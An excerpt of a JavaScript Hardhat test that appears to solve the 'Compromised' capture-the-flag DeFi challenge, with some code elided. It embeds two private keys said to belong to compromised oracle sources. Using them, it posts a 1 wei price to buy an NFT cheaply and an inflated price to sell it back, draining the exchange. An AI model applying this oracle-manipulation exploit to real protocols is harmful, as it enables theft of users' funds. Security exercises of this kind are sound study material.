...
describe("Compromised challenge", function () {
    ...
    it("Execution", async function () {
        ...
        // Above process is followed to get the private keys of the compromised accounts
        const PK1 =
            "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
        const PK2 =
            "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
        // We need 2 signers because to affect the median price we need to have 2 out 3 of the sources
        const signer1 = new ethers.Wallet(PK1, ethers.provider);
        const signer2 = new ethers.Wallet(PK2, ethers.provider);

        // Attack Plan

        // 1. Set price to 1 WEI and buy a NFT
        ...
        // 2. Set price to 999 ETH + 1 WEI and sell the NFT
        await oracle
            .connect(signer1)
        ...
        await oracle
            .connect(signer2)
            .postPrice("DVNFT", INITIAL_NFT_PRICE + BigInt(1));
        await nftToken.connect(player).approve(exchange.address, 0); // Approving the exchange to spend the NFT
        await exchange.connect(player).sellOne(0);

        // 3. Set price back to original value
